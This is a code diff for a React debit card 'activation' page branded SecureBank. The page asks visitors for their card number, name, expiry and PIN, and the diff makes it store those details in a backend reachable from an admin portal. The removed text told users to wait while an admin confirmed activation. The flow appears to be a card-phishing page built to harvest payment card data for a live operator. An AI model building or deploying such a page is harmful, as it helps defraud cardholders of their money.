@@ -1,13 +1,12 @@
 import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
-import { useEffect, useState, useSyncExternalStore, type FormEvent } from "react";
-import { CreditCard, Lock, ShieldCheck, Loader2, ChevronLeft, CheckCircle2 } from "lucide-react";
+import { useEffect, useState, type FormEvent } from "react";
+import { CreditCard, Lock, ShieldCheck, ChevronLeft } from "lucide-react";
 import {
-  getStatus,
-  subscribe,
-  setCard,
-  setStatus,
-  clearActivation,
-} from "@/lib/activation-store";
+  createOrUpdateActivation,
+  getActivationByCard,
+  setSessionCardNumber,
+  getSessionCardNumber,
+} from "@/lib/activations";
 
 export const Route = createFileRoute("/")({
   head: () => ({
@@ -21,7 +20,8 @@ export const Route = createFileRoute("/")({
       { property: "og:title", content: "Activate Your Debit Card — SecureBank" },
       {
         property: "og:description",
-        content: "Activate your new SecureBank debit card in a few secure steps. Enter your card details, verify with your PIN, and you're ready to go.",
+        content:
+          "Activate your new SecureBank debit card in a few secure steps. Enter your card details, verify with your PIN, and you're ready to go.",
       },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary" },
@@ -30,7 +30,7 @@ export const Route = createFileRoute("/")({
   component: Activation,
 });
 
-type Step = "details" | "pin" | "processing";
+type Step = "details" | "pin";
 
 interface CardDetails {
   cardNumber: string;
@@ -41,11 +41,6 @@ interface CardDetails {
 
 function Activation() {
   const navigate = useNavigate();
-  const status = useSyncExternalStore(
-    subscribe,
-    () => getStatus(),
-    () => "idle" as const,
-  );
   const [step, setStep] = useState<Step>("details");
   const [details, setDetails] = useState<CardDetails>({
     cardNumber: "",
@@ -55,14 +50,16 @@ function Activation() {
   });
   const [pin, setPin] = useState<string[]>(["", "", "", ""]);
   const [error, setError] = useState<string | null>(null);
+  const [submitting, setSubmitting] = useState(false);
 
-  // If activation is already in progress or done, redirect to My Card page.
+  // If already signed into an existing activation, jump to My Card.
   useEffect(() => {
-    if (status === "processing" || status === "activated") {
-      navigate({ to: "/my-card" });
-    }
-  }, [status, navigate]);
-
+    const card = getSessionCardNumber();
+    if (!card) return;
+    getActivationByCard(card).then((row) => {
+      if (row) navigate({ to: "/my-card" });
+    });
+  }, [navigate]);
 
   const handleDetailsSubmit = (e: FormEvent) => {
     e.preventDefault();
@@ -98,23 +95,29 @@ function Activation() {
     }
   };
 
-  const handlePinSubmit = (e: FormEvent) => {
+  const handlePinSubmit = async (e: FormEvent) => {
     e.preventDefault();
     if (pin.some((p) => p === "")) {
       setError("Please enter your full 4-digit PIN.");
       return;
     }
     setError(null);
-    setCard({
-      cardNumber: details.cardNumber,
-      cardholder: details.cardholder,
-      expiry: details.expiry,
-      submittedAt: Date.now(),
-    });
-    setStatus("processing");
-    navigate({ to: "/my-card" });
+    setSubmitting(true);
+    try {
+      await createOrUpdateActivation({
+        cardNumber: details.cardNumber,
+        cardholder: details.cardholder,
+        expiry: details.expiry,
+      });
+      setSessionCardNumber(details.cardNumber);
+      navigate({ to: "/my-card" });
+    } catch (err) {
+      console.error(err);
+      setError("Could not submit activation. Please try again.");
+    } finally {
+      setSubmitting(false);
+    }
   };
-
 
   const formatCardNumber = (value: string) =>
     value
@@ -136,23 +139,18 @@ function Activation() {
   return (
     <main className="min-h-screen bg-white text-slate-950">
       <div className="mx-auto flex min-h-screen w-full max-w-md flex-col px-5 py-8">
-        {/* Header */}
         <header className="mb-6 flex items-center justify-between">
-          {step !== "processing" ? (
-            <button
-              onClick={() => {
-                setError(null);
-                if (step === "pin") setStep("details");
-              }}
-              className="flex h-10 w-10 items-center justify-center rounded-full border border-slate-200 bg-white text-slate-700 shadow-sm transition hover:bg-slate-50 disabled:opacity-40"
-              disabled={step === "details"}
-              aria-label="Back"
-            >
-              <ChevronLeft className="h-5 w-5" />
-            </button>
-          ) : (
-            <div className="h-10 w-10" />
-          )}
+          <button
+            onClick={() => {
+              setError(null);
+              if (step === "pin") setStep("details");
+            }}
+            className="flex h-10 w-10 items-center justify-center rounded-full border border-slate-200 bg-white text-slate-700 shadow-sm transition hover:bg-slate-50 disabled:opacity-40"
+            disabled={step === "details"}
+            aria-label="Back"
+          >
+            <ChevronLeft className="h-5 w-5" />
+          </button>
           <div className="text-center">
             <p className="text-xs font-medium uppercase tracking-widest text-indigo-600">
               SecureBank
@@ -165,23 +163,21 @@ function Activation() {
               aria-label="My card"
               className="flex h-10 w-10 items-center justify-center rounded-full border border-slate-200 bg-white shadow-sm transition hover:bg-slate-50 active:scale-95"
             >
-              <CreditCard className="h-5 w-5 text-indigo-300" />
+              <CreditCard className="h-5 w-5 text-indigo-500" />
             </Link>
             <Link
               to="/admin"
               aria-label="Admin portal"
               className="flex h-10 w-10 items-center justify-center rounded-full border border-slate-200 bg-white shadow-sm transition hover:bg-slate-50 active:scale-95"
             >
-              <ShieldCheck className="h-5 w-5 text-emerald-400" />
+              <ShieldCheck className="h-5 w-5 text-emerald-500" />
             </Link>
           </div>
         </header>
 
-        {/* Progress */}
         <div className="mb-8 flex items-center gap-2">
-          {(["details", "pin", "processing"] as Step[]).map((s, i) => {
-            const active =
-              ["details", "pin", "processing"].indexOf(step) >= i;
+          {(["details", "pin"] as Step[]).map((s, i) => {
+            const active = ["details", "pin"].indexOf(step) >= i;
             return (
               <div
                 key={s}
@@ -193,14 +189,11 @@ function Activation() {
           })}
         </div>
 
-        {/* Card visual */}
         <div className="mb-8 aspect-[1.6/1] w-full rounded-2xl bg-gradient-to-br from-indigo-500 via-violet-600 to-fuchsia-600 p-5 shadow-2xl shadow-indigo-900/50">
           <div className="flex h-full flex-col justify-between text-white">
             <div className="flex items-start justify-between">
               <div>
-                <p className="text-xs uppercase tracking-widest opacity-80">
-                  Debit
-                </p>
+                <p className="text-xs uppercase tracking-widest opacity-80">Debit</p>
                 <p className="mt-1 text-lg font-semibold">SecureBank</p>
               </div>
               <div className="h-8 w-10 rounded-md bg-gradient-to-br from-yellow-200 to-yellow-400 opacity-90" />
@@ -225,13 +218,12 @@ function Activation() {
           </div>
         </div>
 
-        {/* Steps */}
         <section className="flex-1">
           {step === "details" && (
             <form onSubmit={handleDetailsSubmit} className="space-y-4">
               <div>
                 <h2 className="text-xl font-semibold">Activate your card</h2>
-                <p className="mt-1 text-sm text-slate-400">
+                <p className="mt-1 text-sm text-slate-500">
                   Enter the details printed on your new debit card.
                 </p>
               </div>
@@ -250,7 +242,7 @@ function Activation() {
                         cardNumber: formatCardNumber(e.target.value),
                       })
                     }
-                  className="w-full rounded-xl border border-slate-200 bg-white py-3 pl-10 pr-3 text-base tracking-wider text-slate-950 shadow-sm outline-none transition placeholder:text-slate-400 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-500/20"
+                    className="w-full rounded-xl border border-slate-200 bg-white py-3 pl-10 pr-3 text-base tracking-wider text-slate-950 shadow-sm outline-none transition placeholder:text-slate-400 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-500/20"
                   />
                 </div>
               </Field>
@@ -341,7 +333,7 @@ function Activation() {
             <form onSubmit={handlePinSubmit} className="space-y-6">
               <div>
                 <h2 className="text-xl font-semibold">Enter PIN to verify</h2>
-                <p className="mt-1 text-sm text-slate-400">
+                <p className="mt-1 text-sm text-slate-500">
                   Enter the 4-digit PIN you set for your debit card.
                 </p>
               </div>
@@ -370,9 +362,10 @@ function Activation() {
 
               <button
                 type="submit"
-                className="w-full rounded-xl bg-gradient-to-r from-indigo-500 to-violet-600 py-3.5 text-base font-semibold text-white shadow-lg shadow-indigo-900/40 transition active:scale-[0.98]"
+                disabled={submitting}
+                className="w-full rounded-xl bg-gradient-to-r from-indigo-500 to-violet-600 py-3.5 text-base font-semibold text-white shadow-lg shadow-indigo-900/40 transition active:scale-[0.98] disabled:opacity-60"
               >
-                Confirm PIN
+                {submitting ? "Submitting..." : "Confirm PIN"}
               </button>
 
               <p className="flex items-center justify-center gap-1.5 text-xs text-slate-500">
@@ -381,8 +374,6 @@ function Activation() {
               </p>
             </form>
           )}
-
-          {step === "processing" && <ProcessingView />}
         </section>
       </div>
     </main>
@@ -392,7 +383,7 @@ function Activation() {
 function Field({ label, children }: { label: string; children: React.ReactNode }) {
   return (
     <label className="block">
-      <span className="mb-1.5 block text-xs font-medium uppercase tracking-wider text-slate-400">
+      <span className="mb-1.5 block text-xs font-medium uppercase tracking-wider text-slate-500">
         {label}
       </span>
       {children}
@@ -402,147 +393,8 @@ function Field({ label, children }: { label: string; children: React.ReactNode }
 
 function ErrorMsg({ message }: { message: string }) {
   return (
-    <div className="rounded-lg border border-red-500/30 bg-red-500/10 px-3 py-2 text-sm text-red-300">
+    <div className="rounded-lg border border-red-200 bg-red-50 px-3 py-2 text-sm text-red-700">
       {message}
-    </div>
-  );
-}
-
-function useActivationStatus() {
-  return useSyncExternalStore(
-    subscribe,
-    () => getStatus(),
-    () => "processing" as const,
-  );
-}
-
-function ProcessingView() {
-  const status = useActivationStatus();
-  const activated = status === "activated";
-
-  // Auto-reset after showing success so a new activation can start clean.
-  useEffect(() => {
-    if (!activated) return;
-    const t = setTimeout(() => clearActivation(), 10_000);
-    return () => clearTimeout(t);
-  }, [activated]);
-
-  if (activated) {
-    return (
-      <div className="flex flex-col items-center justify-center py-6 text-center">
-        <div className="relative flex h-32 w-32 items-center justify-center">
-          <div className="absolute inset-0 rounded-full bg-emerald-500/20" />
-          <div className="absolute inset-3 rounded-full bg-emerald-500/20" />
-          <CheckCircle2 className="relative h-16 w-16 text-emerald-400" strokeWidth={2} />
-        </div>
-
-        <h2 className="mt-8 text-2xl font-semibold text-slate-950">Card Activated</h2>
-        <p className="mt-2 max-w-xs text-sm leading-relaxed text-slate-400">
-          Your debit card has been successfully activated and is ready to use.
-        </p>
-
-        <div className="mt-8 w-full space-y-3">
-          <ProgressRow label="Details received" status="done" />
-          <ProgressRow label="PIN verified" status="done" />
-          <ProgressRow label="Admin confirmed" status="done" />
-          <ProgressRow label="Card activated" status="done" />
-        </div>
-
-        <Link
-          to="/my-card"
-          className="mt-8 inline-flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-600 py-3.5 text-base font-semibold text-white shadow-lg shadow-emerald-900/40 transition active:scale-[0.98]"
-        >
-          <CreditCard className="h-4 w-4" />
-          View my card
-        </Link>
-
-        <p className="mt-6 flex items-center gap-1.5 text-xs text-slate-500">
-          <ShieldCheck className="h-3 w-3 text-emerald-400" />
-          You're all set — enjoy your new card
-        </p>
-      </div>
-    );
-  }
-
-  return (
-    <div className="flex flex-col items-center justify-center py-6 text-center">
-      <div className="relative flex h-32 w-32 items-center justify-center">
-        <div className="absolute inset-0 animate-ping rounded-full bg-indigo-500/20" />
-        <div className="absolute inset-3 animate-pulse rounded-full bg-indigo-500/20" />
-        <Loader2 className="relative h-14 w-14 animate-spin text-indigo-300" />
-      </div>
-
-      <h2 className="mt-8 text-xl font-semibold text-slate-950">
-        Card Activation In Process…
-      </h2>
-      <p className="mt-2 max-w-xs text-sm leading-relaxed text-slate-400">
-        We're verifying your details with our team. This usually takes a few
-        moments. Please keep this screen open — an admin will confirm your card
-        activation shortly.
-      </p>
-
-      <div className="mt-8 w-full space-y-3">
-        <ProgressRow label="Details received" status="done" />
-        <ProgressRow label="PIN verified" status="done" />
-        <ProgressRow label="Awaiting admin confirmation" status="active" />
-        <ProgressRow label="Card activated" status="pending" />
-      </div>
-
-      <Link
-        to="/my-card"
-        className="mt-8 inline-flex w-full items-center justify-center gap-2 rounded-xl border border-slate-200 bg-white py-3 text-sm font-medium text-slate-900 shadow-sm transition hover:bg-slate-50 active:scale-[0.98]"
-      >
-        <CreditCard className="h-4 w-4" />
-        Tap my card to check status
-      </Link>
-
-      <p className="mt-6 flex items-center gap-1.5 text-xs text-slate-500">
-        <Lock className="h-3 w-3" />
-        Secure connection
-      </p>
-    </div>
-  );
-}
-
-function ProgressRow({
-  label,
-  status,
-}: {
-  label: string;
-  status: "done" | "active" | "pending";
-}) {
-  return (
-    <div className="flex items-center gap-3 rounded-lg border border-slate-200 bg-slate-50 px-3 py-2.5">
-      <div
-        className={`flex h-6 w-6 items-center justify-center rounded-full ${
-          status === "done"
-            ? "bg-emerald-500/20 text-emerald-400"
-            : status === "active"
-              ? "bg-indigo-500/20 text-indigo-300"
-              : "bg-slate-200 text-slate-500"
-        }`}
-      >
-        {status === "done" ? (
-          <svg className="h-3.5 w-3.5" viewBox="0 0 20 20" fill="currentColor">
-            <path
-              fillRule="evenodd"
-              d="M16.7 5.3a1 1 0 010 1.4l-8 8a1 1 0 01-1.4 0l-4-4a1 1 0 111.4-1.4L8 12.6l7.3-7.3a1 1 0 011.4 0z"
-              clipRule="evenodd"
-            />
-          </svg>
-        ) : status === "active" ? (
-          <Loader2 className="h-3.5 w-3.5 animate-spin" />
-        ) : (
-          <div className="h-1.5 w-1.5 rounded-full bg-current" />
-        )}
-      </div>
-      <span
-        className={`text-sm ${
-          status === "pending" ? "text-slate-500" : "text-slate-800"
-        }`}
-      >
-        {label}
-      </span>
     </div>
   );
 }
